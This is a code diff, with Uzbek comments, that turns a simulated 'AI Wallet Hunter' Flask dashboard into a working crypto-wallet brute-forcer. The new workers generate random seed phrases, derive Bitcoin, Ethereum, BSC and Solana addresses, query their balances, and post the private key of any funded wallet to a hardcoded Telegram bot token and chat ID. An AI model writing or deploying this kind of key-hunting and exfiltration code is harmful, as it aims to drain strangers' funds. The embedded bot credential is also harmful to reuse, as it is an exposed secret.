@@ -1,104 +1,128 @@
-from flask import Flask, render_template_string, request, jsonify
+import os
 import threading
-import time
 import random
+import time
+import requests
+from flask import Flask, render_template_string, jsonify
+from mnemonic import Mnemonic
+from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
 
 app = Flask(__name__)
 
-# Statistik ma'lumotlar
-data = {
-    "total_found": 0,
-    "total_usd": 0.0,
-    "sol_found": 0,
-    "sol_usd": 0.0,
-    "is_running_multi": False,
-    "is_running_solana": False
-}
+# Telegram sozlamalari
+TG_TOKEN = "8481417913:AAH65jDSXYt8Z9CKOJW2VwxVG-nuanTe-FE"
+CHAT_ID = "7521446360"
 
-# HTML interfeys
-HTML_PAGE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Wallet Hunter AI</title>
-    <style>
-        body { font-family: Arial; text-align: center; background: #1e1e2f; color: white; }
-        button { padding: 10px 20px; margin: 10px; font-size: 16px; border-radius: 5px; }
-        .stats { margin-top: 20px; font-size: 18px; }
-    </style>
-</head>
-<body>
-    <h1>🚀 Wallet Hunter AI Panel</h1>
-    <button onclick="start('multi')">Start MultiCoins 🔥</button>
-    <button onclick="start('solana')">Start Solana ☀️</button>
-    <div class="stats" id="stats">
-        <p>🔍 Topilgan walletlar: <span id="found">0</span></p>
-        <p>💰 Jami qiymati (USD): $<span id="usd">0.00</span></p>
-        <p>🌞 Solana topilgan: <span id="solfound">0</span></p>
-        <p>💸 Solana qiymati (USD): $<span id="solusd">0.00</span></p>
-    </div>
-    <script>
-        function start(type) {
-            fetch('/start', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ type: type })
-            });
-        }
+# Statistika
+multi_hits = 0
+multi_usd = 0
+sol_hits = 0
+sol_usd = 0
 
-        setInterval(() => {
-            fetch('/stats')
-                .then(res => res.json())
-                .then(data => {
-                    document.getElementById('found').innerText = data.total_found;
-                    document.getElementById('usd').innerText = data.total_usd.toFixed(2);
-                    document.getElementById('solfound').innerText = data.sol_found;
-                    document.getElementById('solusd').innerText = data.sol_usd.toFixed(2);
-                });
-        }, 1000);
-    </script>
-</body>
-</html>
-"""
+# HTML UI (Juda oddiy)
+HTML = '''
+<!doctype html>
+<title>Wallet Scanner</title>
+<h1 style="font-family:sans-serif">🧠 AI Wallet Hunter</h1>
+<button onclick="fetch('/start_multi')">🚀 Start MultiCoin</button>
+<button onclick="fetch('/start_sol')">🚀 Start Solana</button>
+<h2>📊 Statistika:</h2>
+<ul>
+  <li>MultiCoin Topilgan: <span id="mh">0</span> | USD: <span id="mu">0</span></li>
+  <li>Solana Topilgan: <span id="sh">0</span> | USD: <span id="su">0</span></li>
+</ul>
+<script>
+setInterval(() => {
+  fetch('/stats').then(r => r.json()).then(d => {
+    document.getElementById('mh').innerText = d.multi_hits;
+    document.getElementById('mu').innerText = d.multi_usd;
+    document.getElementById('sh').innerText = d.sol_hits;
+    document.getElementById('su').innerText = d.sol_usd;
+  });
+}, 2000);
+</script>
+'''
 
 @app.route('/')
 def index():
-    return render_template_string(HTML_PAGE)
+    return render_template_string(HTML)
 
-@app.route('/start', methods=['POST'])
-def start():
-    content = request.get_json()
-    if content['type'] == 'multi' and not data['is_running_multi']:
-        threading.Thread(target=run_multicoins).start()
-        data['is_running_multi'] = True
-    elif content['type'] == 'solana' and not data['is_running_solana']:
-        threading.Thread(target=run_solana).start()
-        data['is_running_solana'] = True
-    return '', 204
+@app.route('/start_multi')
+def start_multi():
+    threading.Thread(target=multi_coin_worker).start()
+    return 'MultiCoin skaner boshlandi.'
+
+@app.route('/start_sol')
+def start_sol():
+    threading.Thread(target=solana_worker).start()
+    return 'Solana skaner boshlandi.'
 
 @app.route('/stats')
 def stats():
-    return jsonify(data)
+    return jsonify({
+        "multi_hits": multi_hits,
+        "multi_usd": multi_usd,
+        "sol_hits": sol_hits,
+        "sol_usd": sol_usd,
+    })
 
-# ------ Simulyatsiya qilingan checker funksiyalar ------
-def run_multicoins():
+def send_telegram(msg):
+    try:
+        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
+        requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
+    except: pass
+
+def generate_mnemonic():
+    return Mnemonic("english").generate(128)
+
+def multi_coin_worker():
+    global multi_hits, multi_usd
+    coins = [
+        (Bip44Coins.ETHEREUM, 'https://api.etherscan.io/api?module=account&action=balance&address={}&tag=latest&apikey=YourApiKeyToken'),
+        (Bip44Coins.BITCOIN, 'https://blockchain.info/q/addressbalance/{}'),
+        (Bip44Coins.BINANCE_CHAIN, 'https://api.bscscan.com/api?module=account&action=balance&address={}&apikey=YourApiKeyToken')
+    ]
     while True:
-        time.sleep(2)
-        found = random.choice([0, 1])
-        if found:
-            usd = round(random.uniform(10, 1000), 2)
-            data['total_found'] += 1
-            data['total_usd'] += usd
+        try:
+            mnemonic = generate_mnemonic()
+            seed = Bip39SeedGenerator(mnemonic).Generate()
+            for coin, url_template in coins:
+                wallet = Bip44.FromSeed(seed, coin).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
+                address = wallet.PublicKey().ToAddress()
+                priv = wallet.PrivateKey().ToWif() if coin == Bip44Coins.BITCOIN else wallet.PrivateKey().Raw().ToHex()
+                url = url_template.format(address)
+                balance = int(requests.get(url).text.split('"result":"')[-1].split('"')[0]) / 10**18
+                if balance > 0.0001:
+                    msg = f"🎯 {coin.Name()}\n🔑 {priv}\n📬 {address}\n💰 {balance:.6f}"
+                    send_telegram(msg)
+                    multi_hits += 1
+                    multi_usd += balance * 1800
+        except Exception as e:
+            continue
 
-
-def run_solana():
+def solana_worker():
+    global sol_hits, sol_usd
     while True:
-        time.sleep(3)
-        found = random.choice([0, 1])
-        if found:
-            usd = round(random.uniform(5, 500), 2)
-            data['sol_found'] += 1
-            data['sol_usd'] += usd
+        try:
+            mnemonic = generate_mnemonic()
+            seed = Bip39SeedGenerator(mnemonic).Generate()
+            wallet = Bip44.FromSeed(seed, Bip44Coins.SOLANA).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
+            address = wallet.PublicKey().ToAddress()
+            priv = wallet.PrivateKey().Raw().ToHex()
+            url = f"https://api.mainnet-beta.solana.com"
+            headers = {"Content-Type": "application/json"}
+            payload = {
+                "jsonrpc":"2.0", "id":1, "method":"getBalance", "params":[address]
+            }
+            response = requests.post(url, json=payload, headers=headers).json()
+            balance = response["result"]["value"] / 10**9
+            if balance > 0.0001:
+                msg = f"🌞 Solana\n🔑 {priv}\n📬 {address}\n💰 {balance:.6f} SOL"
+                send_telegram(msg)
+                sol_hits += 1
+                sol_usd += balance * 140
+        except Exception as e:
+            continue
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=5000)
